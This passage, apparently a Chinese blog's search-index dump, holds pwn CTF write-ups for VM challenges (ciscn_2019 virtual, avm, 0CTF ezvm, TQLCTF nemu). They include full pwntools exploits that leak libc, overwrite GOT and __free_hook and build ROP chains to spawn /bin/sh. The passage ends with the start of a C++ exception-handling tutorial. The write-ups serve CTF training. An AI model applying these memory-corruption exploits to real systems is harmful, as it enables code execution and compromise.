0xb0：XOR：reg[high] = reg[low] ^ reg[medium] # - 0xc0：SHL：reg[high] = reg[medium] \u003c\u003c reg[low] # - 0xd0：SHR：reg[high] = reg[medium] \u003e\u003e reg[low] # - 0xe0：EXIT：停止执行 # 使用示例 vm = VM() #create a stderr address in reg array #负数偏移指向stderr vm.opcode(0x10, 0, 0, 26) #mov reg[0], 26 vm.opcode(0x80, 2, 1, 0) #reg[2] = reg[1]-reg[0] = FFFFFFE6 vm.opcode(0x30, 4, 0, 2) #mov reg[4],memory[reg[2]] vm.opcode(0x10,0,0,25) #mov reg[0],25 vm.opcode(0x80,2,1,0) #reg[2]=reg[1]-reg[0] vm.opcode(0x30,5,0,2) #mov reg[5],memory[reg[2]] reg[4][5]---\u003estderr address # create free_hook address through stderr address # stderr + 0x10a0 = free_hook - 0x8 vm.opcode(0x10,2,0,0x10) #mov reg[2],0x10 vm.opcode(0x10,0,0,8) #mov reg[0],8 vm.opcode(0xc0,1,2,0) #reg[1]=sal reg[2],8 vm.opcode(0x10,2,0,0xa0) #mov reg[2],0xa0 vm.opcode(0x70,1,1,2) #add reg[1],reg[2] vm.opcode(0x70,4,4,1) #add reg[4],reg[1] reg[4][5]---\u003efree_hook address-8 # let pointer comment point to free_hook vm.opcode(0x10,0,0,0x8) #mov reg[0],8 vm.opcode(0x80,2,7,0) #reg[2]=reg[7]-reg[0] = FFFFFFF8 vm.opcode(0x40,4,0,2) #mov memory[reg[2]],reg[4] vm.opcode(0x10,0,0,0x7) #mov reg[0],9 vm.opcode(0x80,2,7,0) #reg[2]=reg[7]-reg[0] vm.opcode(0x40,5,0,2) #mov memory[reg[2]],reg[5] vm.send_all() p.recvuntil(\"R4: \") addr1=int(p.recv(8),16) p.recvuntil(\"R5: \") addr2=int(p.recv(4),16) sys_addr=addr1+((addr2)\u003c\u003c32)-0x381410 lg(\"sys_addr\") # dbg() p.sendafter(\"HOW DO YO","date":"2025-10-23","objectID":"/posts/vmpwn/:1:2","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#exp"},{"categories":["pwn"],"collections":null,"content":"ciscn_2019_qual_virtual\r先分配几个堆块 s = malloc(0x20u); // name data = alloc(0x40); text = alloc(0x80); stack = alloc(0x40); ptr = malloc(0x400u); 输入数据，将指令转成opcode，数据写入data puts(\"Your program name:\"); input(s, 32); puts(\"Your instruction:\"); input(ptr, 0x400); get_opcode_numnber(text, ptr); puts(\"Your stack data:\"); input(ptr, 0x400); get_data(data, ptr); 交互方式大致为： sla(b'name:\\n',b'j4f') sla(b'instruction:\\n',b'push push push add pop') sla(b'stack data:\\n',b'2 4 6') 指令： push: push数据，后push的在伪造stack的高地址 pop：stack高地址的数据，给data的低地址 add: stack两个高地址的数据相加，存在stack次高地址处 sub：stack两个高地址的数据相减(高地址减次高地址)，存在stack次高地址处 mul: stack两个高地址的数据相乘，存在stack次高地址处 div: stack两个高地址的数据相除，存在stack次高地址处 load: 往stack_data + flag + 偏移处，写入基于stack_data某偏移内容 load指令： 存数据到栈顶 // load __int64 __fastcall sub_401CCE(alloc_heap *stack, __int64 data) { __int64 v3; // [rsp+10h] [rbp-10h] BYREF if ( (unsigned int)give_v1_2_v2(stack, \u0026v3) ) //这里会把flag-1 return give_v2_2_V1(stack, *((_QWORD *)stack-\u003edata_ptr + stack-\u003eflag + v3)); //这里flag+1 else return 0; } 把*((_QWORD *)stack-\u003edata_ptr + stack-\u003eflag + v3))的值给栈顶 注意flag - 1 save指令： 写数据到*((_QWORD *)stack-\u003edata_ptr + stack-\u003eflag + v3)中 // save __int64 __fastcall sub_401D37(alloc_heap *stack, __int64 data) { __int64 v3; // [rsp+10h] [rbp-10h] BYREF __int64 v4; // [rsp+18h] [rbp-8h] BYREF if ( !(unsigned int)give_v1_2_v2(stack, \u0026v3) || !(unsigned int)give_v1_2_v2(stack, \u0026v4) ) //注意这里会把flag -2 return 0; *((_QWORD *)stack-\u003edata_ptr + stack-\u003eflag + v3) = v4; return 1; } 先push的是v4 注意flag -2 execute完之后，会puts(s);，这里把puts_got改成system，s写入/bin/sh ","date":"2025-10-23","objectID":"/posts/vmpwn/:2:0","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#ciscn_2019_qual_virtual"},{"categories":["pwn"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" b *0x401332 c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"node5.buuoj.cn\",29332 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): # gdb.attach(p) gdb.attach(p, gdbscript=gdbscript) # pause() # data 0x200 # text 0x400 # stack 0x200 # instruction 0x400 p.sendlineafter(\"Your program name:\\n\",\"/bin/sh\\x00\") p.sendlineafter(\"Your instruction:\\n\",\"push push save push load push add push save\") p.sendlineafter(\"Your stack data:\\n\",\"4210896 -3 -21 -172800 -21\") itr() ","date":"2025-10-23","objectID":"/posts/vmpwn/:2:1","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#exp-1"},{"categories":["pwn"],"collections":null,"content":"长城杯pwn—avm\r文章及附件：https://bbs.kanxue.com/thread-284826.htm 这里我直接拿我本地的libc做了 vm结构体 struct vm_struct { _QWORD reg[32]; _QWORD rip; _QWORD opcode; _QWORD num; }; 交互： 一条指令32个bit，最高4个bit作为instruction，0-4、5-9、16-20作为low,medium,high def op(opcode,high,medium,low): ope = p32(opcode\u003c\u003c28 | (high\u00260x1f)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (low\u00260x1f)) return ope def add(high,medium,low): ret op(1,high,medium,low) def load(offset,medium,src,opcode=9): ope = p32(opcode\u003c\u003c28 | (offset\u00260xfff)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (src\u00260x1f)) return ope def store(offset,medium,dest,opcode=10): ope = p32(opcode\u003c\u003c28 | (offset\u00260xfff)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (dest\u00260x1f)) return ope 指令: 4个字节一个指令 add: low = high + medium sub: low = medium - high mul: low = high*medium div: low = medium/high xor: low = high^medium and: low = high\u0026medium shl: low = medium\u003c\u003chigh shr: low = medium\u003e\u003ehigh load：把low寄存器中的内容，写到某栈地址+medium寄存器内容+偏移处 这里low和medium不要是同一寄存器 unsigned __int64 __fastcall load(vm_struct *vm_struct, __int64 stack) { unsigned __int64 result; // rax unsigned int v3; // [rsp+20h] [rbp-20h] _QWORD *v4; // [rsp+30h] [rbp-10h] v3 = *(_DWORD *)(vm_struct-\u003eopcode + (vm_struct-\u003erip \u0026 0xFFFFFFFFFFFFFFFCLL)); vm_struct-\u003erip += 4LL; result = (unsigned __int8)byte_4010; // 0xff if ( (unsigned __int8)(vm_struct-\u003ereg[(v3 \u003e\u003e 5) \u0026 0x1F] + BYTE2(v3)) \u003c (unsigned __int8)byte_4010 ) { v4 = (_QWORD *)((unsigned __int16)(vm_struct-\u003ereg[(v3 \u003e\u003e 5) \u0026 0x1F] + (HIWORD(v3) \u0026 0xFFF)) + stack); *v4 = vm_struct-\u003ereg[v3 \u0026 0x1F]; return (unsigned __int64)v4; } return result; } store：把某栈地址+medium寄存器内容+偏移处的8字节，给low寄存器 vm_struct *__fastcall mov(vm_struct *vm_struct, __int64 a2) { vm_struct *vm_struct_1; // rax unsigned __int16 v3; // [rsp+1Eh] [rbp-22h] unsigned int v4; // [rsp+20h] [rbp-20h] v4 = *(_DWORD *)(vm_struct-\u003eopcode + (vm_struct-\u003erip \u0026 0xFFFFFFFFFFFFFFFCLL)); vm_struct-\u003erip += 4LL; vm_struct_1 = (vm_struct *)(unsigned __int8)byte_4010; if ( (unsigned __int8)(vm_struct-\u003ereg[(v4 \u003e\u003e 5) \u0026 0x1F] + BYTE2(v4)) \u003c (unsigned __int8)byte_4010 )// 0xff { vm_struct_1 = vm_struct; v3 = vm_struct-\u003ereg[(v4 \u003e\u003e 5) \u0026 0x1F] + (HIWORD(v4) \u0026 0xFFF); vm_struct-\u003ereg[v4 \u0026 0x1F] = ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 7) \u003c\u003c 56) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 6) \u003c\u003c 48) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 5) \u003c\u003c 40) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 4) \u003c\u003c 32) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 3) \u003c\u003c 24) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 2) \u003c\u003c 16) | *(unsigned __int16 *)(v3 + a2); } return vm_struct_1; } ","date":"2025-10-23","objectID":"/posts/vmpwn/:3:0","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#长城杯pwnavm"},{"categories":["pwn"],"collections":null,"content":"思路\r把栈上的libc地址存在vm_struct的寄存器中 因为我们的opcode是存在栈上的，所以在opcode的末尾可以加上我们自己的东西 把寄存器的libc地址，加减我们写入opcode末尾的偏移，构造rop链 把rop链写入栈中返回地址处 ","date":"2025-10-23","objectID":"/posts/vmpwn/:3:1","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#思路-1"},{"categories":["pwn"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn1' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" # bbase 0x1b70 # bbase 0x1AFB #Unsupported instruction的leave;ret bbase 0x1aad c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): # gdb.attach(p) gdb.attach(p, gdbscript=gdbscript) # pause() def op(opcode,high,medium,low): ope = p32(opcode\u003c\u003c28 | (high\u00260x1f)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (low\u00260x1f)) return ope def add(high,medium,low): return op(1,high,medium,low) def sub(high,medium,low): return op(2,high,medium,low) def load(offset,medium,src,opcode=9): ope = p32(opcode\u003c\u003c28 | (offset\u00260xfff)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (src\u00260x1f)) return ope def store(offset,medium,dest,opcode=10): ope = p32(opcode\u003c\u003c28 | (offset\u00260xfff)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (dest\u00260x1f)) return ope base_addr = 0x120+0x38 dest_offset = 0x118 #dest: # 04:0020│ rdx rsi 0x7ffe2b9fa530 —▸ 0x7955af50f78b (__spawnix+875) ◂— pop rdi #ret_addr: # 27:0138│+008 0x7ffe2b9fa648 —▸ 0x5ac76e63fb9d ◂— nop opcode = store(0xd38,0,0) #libc地址给寄存器0 opcode+= store(base_addr,20,1) #system的偏移给寄存器1，20这里随便设置，不和low一样就行 opcode+= store(base_addr+8,20,2) #binsh的偏移给寄存器2 opcode+= store(base_addr+0x10,20,3) #ret的偏移给寄存器3 opcode+= store(base_addr+0x18,20,4) #pop_rdi_ret偏移给寄存器4 opcode+= add(0,1,5) #寄存器5=寄存器0+system偏移=system地址 opcode+= add(0,2,6) #寄存器6=寄存器0+binsh偏移=binsh地址 opcode+= sub(3,0,7) #寄存器7=寄存器0-ret偏移=ret地址 opcode+= add(0,4,8) #寄存器8=寄存器0+pop_rdi_ret偏移=pop_rdi_ret地址 opcode+= load(dest_offset,20,8) #pop_rdi_ret opcode+= load(dest_offset+8,20,6) #binsh opcode+= load(dest_offset+0x10,20,7) #ret opcode+= load(dest_offset+0x18,20,5) #system opcode+=p32(0) opcode+=p64(0x2e586) #system opcode+=p64(0x1a1265) #binsh opcode+=p64(0x199b) #ret opcode+=p64(0xe55c1) #pop_rdi_ret # dbg() sla(b'opcode: ',opcode) itr() # sbase 0x40c0 # 0x7fff2d02dd50 #main栈帧中存储opcode地址 # 0x7fff2d02dc30 #execute 中stack地址 #之间偏移为0x120 #system = 寄存器0 + 0x2e586 #binsh = 寄存器0 + 0x1a1265 #ret = 寄存器0 - 0x199b #pop_rdi_ret = 寄存器0 + 0xe55c1 # pwndbg\u003e sbase 0x40c0 # 00:0000│ rax rdi 0x6127080540c0 —▸ 0x759f7fe2a1ca (__libc_start_call_main+122) ◂— mov edi, eax # 01:0008│ 0x6127080540c8 ◂— 0 # 02:0010│ 0x6127080540d0 ◂— 0 # 03:0018│ 0x6127080540d8 ◂— 0 # 04:0020│ 0x6127080540e0 ◂— 0 # 05:0028│ 0x6127080540e8 ◂— 0 # 06:0030│ 0x6127080540f0 ◂— 0 # 07:0038│ 0x6127080540f8 ◂— 0 # 08:0040│ 0x612708054100 ◂— 0 # 09:0048│ 0x612708054108 ◂— 0 # pwndbg\u003e p \u0026system # $1 = (int (*)(const char *)) 0x759f7fe58750 \u003c__libc_system\u003e # pwndbg\u003e search \"/bin/sh\" # Searching for byte: b'/bin/sh' # libc.so.6 0x759f7ffcb42f 0x68732f6e69622f /* '/bin/sh' */ # pwndbg\u003e p/x 0x759f7fe58750 - 0x759f7fe2a1ca # $2 = 0x2e586 # pwndbg\u003e p/x 0x759f7ffcb42f - 0x759f7fe2a1ca # $3 = 0x1a1265 #ret指令 # 0x000000000002882f : ret # pwndbg\u003e p/x 0x759f7fe2a1ca - 0x759f7fe2","date":"2025-10-23","objectID":"/posts/vmpwn/:3:2","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#exp-2"},{"categories":["pwn"],"collections":null,"content":"2020网鼎杯青龙组-boom1\rhttps://xz.aliyun.com/news/7382?u_atoken=0095c38b74859b438aaf681829ace4ba\u0026u_asig=1a0c381017440330108046584e0135 编译器类vmpwn 大概看了看，程序很大，实现了一个编译器，执行我们输入的C代码。 malloc(0x40000u);会走mmap，申请的变量和libc的偏移是固定的 我们可以定义一个变量，从这个变量的地址寻址到__free_hook和system函数，将后者覆写到前者，再调用free('/bin/sh')即可。 ","date":"2025-10-23","objectID":"/posts/vmpwn/:4:0","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#2020网鼎杯青龙组-boom1"},{"categories":["pwn"],"collections":null,"content":"0CTF/TCTF 2022 ezvm\r别的师傅WP：https://github.com/nobodyisnobody/write-ups/tree/main/0CTF.TCTF.2022/pwn/ezvm 指令梳理： 0 push: 把memory的数据压入栈中 1 pop: 栈中数据弹出到memory 2-12 ： 对栈中数据进行加减乘除等操作，并把sp-1 13 : 判断栈顶是否为0 14-16： jmp jz jnz 17-19: 比较指令 20 mov: 写8字节到bss段（类似寄存器） 21 store:指定寄存器中数据写入到memory区域 22 load:把memory中的数据写入到指定寄存器 交互： push = lambda bss :p8(0)+p8(bss) #压入寄存器的内容到栈 and_f = lambda :p8(9) nz = lambda add_ip :p8(15)+p64(add_ip) jnz = lambda add_ip :p8(16)+p64(add_ip) mov = lambda bss,imm :p8(0x14)+p8(bss)+p64(imm) #imm-\u003e寄存器 store = lambda bss,memory :p8(0x15)+p8(bss)+p64(memory) #寄存器-\u003ememory load = lambda bss,memory :p8(0x16)+p8(bss)+p64(memory) #mrmory-\u003e寄存器 exit_f = lambda :p8(0x17) 关键点在于这个malloc会把size左移3个bit，传入0x2000000000030000就能越界写 .text:0000000000002353 mov rax, [rbp+size_1] .text:0000000000002357 shl rax, 3 .text:000000000000235B mov [rbp+var_10], rax .text:000000000000235F mov rax, [rbp+var_10] .text:0000000000002363 mov rdi, rax ; size .text:0000000000002366 call _malloc 思路： free一个堆块进unsorted bin，memory 区域会留下libc 爆破出libc 利用__call_tls_dtors来getshell ","date":"2025-10-23","objectID":"/posts/vmpwn/:5:0","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#0ctftctf-2022-ezvm"},{"categories":["pwn"],"collections":null,"content":"exp\r不知道为什么最后bye bye的时候退不出去。。 from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\",\"-p\",\"65\",\"-b\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" # bbase 0x23BF #call execute # bbase 0x2353 #malloc # bbase 0x228E #out malloc bbase 0x14e2 #free # bbase 0x1a0d #shr # bbase 0x1582 #switch # bbase 0x246F #exit c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() push = lambda bss :p8(0)+p8(bss) #压入寄存器的内容到栈 and_f = lambda :p8(9) nz = lambda add_ip :p8(15)+p64(add_ip) jnz = lambda add_ip :p8(16)+p64(add_ip) mov = lambda bss,imm :p8(0x14)+p8(bss)+p64(imm) #imm-\u003e寄存器 store = lambda bss,memory :p8(0x15)+p8(bss)+p64(memory) #寄存器-\u003ememory load = lambda bss,memory :p8(0x16)+p8(bss)+p64(memory) #mrmory-\u003e寄存器 exit_f = lambda :p8(0x17) #让memory为main_arena地址 sla(b'0ctf2022!!\\n',b'aaaa') opcode = exit_f() sla(b'code size:\\n',str(len(opcode))) sla(b'memory count:\\n',str(0x410\u003e\u003e3)) sla(b'input your code:\\n',opcode) # sla(b'continue?\\n',b'c') #爆破获取libc libc_base = 0x700000000000 for i in range(4,45,1): print('leaking bit '+str(i)) opcode = mov(0,1\u003c\u003ci) #bitmask存入r0 opcode+= push(0) #bitmask 压栈 opcode+= load(1,0) #main_arena地址存入r1 opcode+= push(1) #r1压栈 opcode+= and_f() #bit_mask 和 main_arena 与运算 opcode+= jnz(1) #该bit为0就exit opcode+= b'\\x18' + exit_f() sla(b'code size:\\n',str(len(opcode))) sla(b'memory count:\\n',str(0x410\u003e\u003e3)) sla(b'input your code:\\n',opcode) buffer = ru(b'finish!\\n',drop=True) if b'what' in buffer: libc_base |= 1\u003c\u003ci libc_base -= 0x219ce0 libc.address = libc_base lg(\"libc_base\") def rol(value): return (value \u003c\u003c 0x11) | (value \u003e\u003e (64 - 0x11)) \u0026 0xffffffffffffffff dest = rol(libc.sym['system']) #$fs_base + 0x30（randnumber） 置0 #0x181760 fs_base+0x30 opcode = store(0,0x302ec) # clear rand val opcode+= mov(0,libc_base - 0x2a00) #0x1816d8 $fs_base - 88 opcode+= store(0,0x302db) # rbp val opcode+= mov(0,dest) #0x1815f0 $fs_base - 0x140 opcode+= store(0,0x302be) # rbp val opcode+= mov(0,next(libc.search(b'/bin/sh'))) #0x1815f8 $fs_base - 0x138 opcode+= store(0,0x302bf) # rbp val opcode+= exit_f() sla(b'code size:\\n',str(len(opcode))) sla(b'memory count:\\n',str(0x2000000000030000)) sl(opcode) dbg() sla(b'continue?', b\"bye bye\\x00\") itr() # p/x $fs_base # opcode_ptr memory_ptr stack_ptr opcodesize mesize # sbase 0x5040 #stack sp #sbase 0x5090 # dq 0x181760 + memory_ptr ","date":"2025-10-23","objectID":"/posts/vmpwn/:5:1","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#exp-3"},{"categories":["pwn"],"collections":null,"content":"TQLCTF2022_nemu\r别的师傅评价：一个完全无限制的越界读写问题。但是看似简单，读写操作的时候还需要经过一些检查。很值得一做。很适合作为VM pwn的入门题目仔细分析(正好也有源码，漏洞很经典) 这题主要考点：理解⼀个模拟器及调试器的整体架构，给了源码 交互： help:查看所有指令description si:单步执行1次 si 2:单步执行2次 c:一直执行 info r:查看寄存器 info w:查看断点 x 0x100005 :查看内容 x 4 0x100000：查看4个dword内容 w *0x100000：设置watch point d 1:删除第一个watch point set \u003c地址\u003e \u003c数据\u003e：修改数据 这里比较重要的就是guest_to_host这个宏 uint32_t vaddr_read(vaddr_t addr, int len) { return paddr_read(addr, len); } uint32_t paddr_read(paddr_t addr, int len) { return pmem_rw(addr, uint32_t) \u0026 (~0u \u003e\u003e ((4 - len) \u003c\u003c 3)); } #define pmem_rw(addr, type) *(type *)({\\ guest_to_host(addr); \\ }) /* convert the guest physical address in the guest program to host virtual address in NEMU */ #define guest_to_host(p) ((void *)(pmem + (unsigned)p)) 这个宏的p是真实的物理地址 pwndbg\u003e disass vaddr_read Dump of assembler code for function vaddr_read: 0x0000000000406ee0 \u003c+0\u003e: mov ecx,0x4 0x0000000000406ee5 \u003c+5\u003e: mov edi,edi 0x0000000000406ee7 \u003c+7\u003e: mov eax,0xffffffff 0x0000000000406eec \u003c+12\u003e: sub ecx,esi 0x0000000000406eee \u003c+14\u003e: shl ecx,0x3 0x0000000000406ef1 \u003c+17\u003e: shr eax,cl 0x0000000000406ef3 \u003c+19\u003e: and eax,DWORD PTR [rdi+0x6a3b80] 0x0000000000406ef9 \u003c+25\u003e: ret End of assembler dump. 查看汇编可以看到0x6a3b80就是p pwndbg\u003e dq 0x6a3b80+0x100000 0x7a3b80 \u003cpmem+1048576\u003e: 0x0027b900001234b8 0x0441c76601890010 0x7a3b90 \u003cpmem+1048592\u003e: 0x6600000002bb0001 0x01ffffe0009984c7 0x7a3ba0 \u003cpmem+1048608\u003e: 0x00d600000000b800 0x0000000000000000 0x7a3bb0 \u003cpmem+1048624\u003e: 0x0000000000000000 0x0000000000000000 100000: b8 34 12 00 00 movl $0x1234,%eax 这里也对应上了 而这里也没有对于边界的检查，所以可以进行越界读，set可以进行越界写 这里需要通过watchpoint去泄露 watchpoint数据结构 typedef struct watchpoint { int NO; struct watchpoint *next; /* TODO: Add more members if necessary */ char exp[30]; uint32_t old_val; uint32_t new_val; } WP; 考虑结构体内存对齐，实际上的内存结构： typedef struct watchpoint { int NO; // Offset: 0x0, Size: 0x4 bytes struct watchpoint *next; // Offset: 0x4, Size: 0x8 bytes /* TODO: Add more members if necessary */ char exp[30]; // Offset: 0x10, Size: 0x1e bytes uint32_t old_val; // Offset: 0x30, Size: 4 bytes uint32_t new_val; // Offset: 0x34, Size: 4 bytes } WP; //总共0x38 list_watchpoint: void list_watchpoint(){ WP *head2 = head; if(head == NULL) { printf(\"No watch pint to delete\\n\"); return; } printf(\"NO Expr Old Value New Value\\n\"); while(head2){ printf(\"%d %-18s %#x %#x\\n\",head2-\u003eNO,head2-\u003eexp,head2-\u003eold_val,head2-\u003enew_val); head2 = head2-\u003enext; } return; } pwndbg\u003e p \u0026head $7 = (WP **) 0x86a3fc8 \u003chead\u003e pwndbg\u003e x/8gx 0x60f018-0x20 0x60eff8: 0x0000000000000000 0x000000000060ee18 0x60f008: 0x00007d7a583572e0 0x00007d7a583332f0 0x60f018 \u003c__snprintf_chk@got.plt\u003e: 0x00007d7a58137d30 0x00007d7a580add30 0x60f028 \u003cputchar@got[plt]\u003e: 0x0000000000401506 0x0000000000401516 这里要让libc地址位于head+0x30处，就能通过old_val new_val泄露出libc地址 #pwndbg\u003e p/x 0x86a3fc8-0x6a3b80 #$1 = 0x8000448 sl(b'set 0x8000448 0x60eff0') # dbg() sl(b'info w') ru(b'New Value') ru(b'0x') libc_low = int(p.recv(8),16) ru(b'0x') libc_high = int(p.recv(4),16) lg(\"libc_high\") lg(\"libc_low\") libc_base = (libc_high\u003c\u003c32) | libc_low lg(\"libc_base\") 写入system： WP *new_wp(){ if(free_ == NULL){ assert(0); } //unlink WP *temp = free_; free_ = free_-\u003enext; //insert temp-\u003enext = NULL; return temp; } void set_watchpoint(char *args){ bool flag = true; uint32_t val = expr(args, \u0026flag); if (!flag) { printf(\"You input an invalid expression, failed to create watchpoint!\"); return ; } WP *wp = new_wp(); wp-\u003eold_val = val; memcpy(wp-\u003eexp, args, 30); //... } 这里可以看到： WP *wp = free_; memcpy(wp-\u003eexp, args, 30); 也就是w 0xdeedbeef的时候，会把0xdeedbeef写入free_+0x30处 这样我们只需要去set free_再w就能实现任意写 这里的思路是写strcmp的got为system，在ui_mainloop中,strcmp的第一个参数就是我们输入的命令，输入binsh就行 exp: 这里我用的本地的libc from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda del","date":"2025-10-23","objectID":"/posts/vmpwn/:6:0","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#tqlctf2022_nemu"},{"categories":["pwn"],"collections":null,"content":"异常处理机制\r","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:0","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#异常处理机制"},{"categories":["pwn"],"collections":null,"content":"基础语法\r异常机制中主要的几个关键字：throw 抛出异常，try-catch响应异常 #include \u003ciostream\u003e using namespace std; int main() { int x, y; cout \u003c\u003c \"请输入两个整数（x y）：\"; cin \u003e\u003e x \u003e\u003e y; try { if (y == 0) { // 抛出异常：除数不能为 0 throw runtime_error(\"除数不能为 0！\"); } cout \u003c\u003c \"结果: \" \u003c\u003c x / y \u003c\u003c endl; } catch (const runtime_error\u0026 e) { // 捕获并处理异常 cout \u003c\u003c \"发生异常：\" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"程序继续运行...\" \u003c\u003c endl; return 0; } 输入 10 2 ， 输出 结果: 5 输入10 0，会输出 发生异常：除数不能为 0！ 程序继续运行... try、catch\rtry { program-statements } catch (exception-declaration) { handler-statements } catch (exception-declaration) { handler-statements } // .. . try块 用 try { ... } 包裹可能产生异常的代码。 在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。 catch块 当 try 内抛出异常时，运行时会寻找匹配的 catch。 一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句 函数退出与栈展开\r在复杂的程序中，可能在一个try语句中嵌套另一个try语句 stack unwinding（栈展开）： 当一个异常被抛出，如果没有对应的catch能处理，就会终止这个函数，并返回给调用者 调用者继续查找自己的 try...catch 如果仍未找到 → 再返回上层调用者 … 一直往上追溯 如果最终没找到任何合适的 catch ，就会调用标准库函数 terminate()，程序直接退出 如果在某一层找到了匹配的catch，那么程序就会进入这个catch块执行，当 catch 执行完，程序会跳到该 try-catch 的最后一个 catch 之后继续执行。 #include \u003ciostream\u003e #include \u003cstdexcept\u003e using namespace std; void funcC() { cout \u003c\u003c \"进入 funcC\" \u003c\u003c endl; throw runtime_error(\"funcC 出现异常\"); // 抛出异常 cout \u003c\u003c \"funcC 正常结束\" \u003c\u003c endl; // 不会执行 } void funcB() { 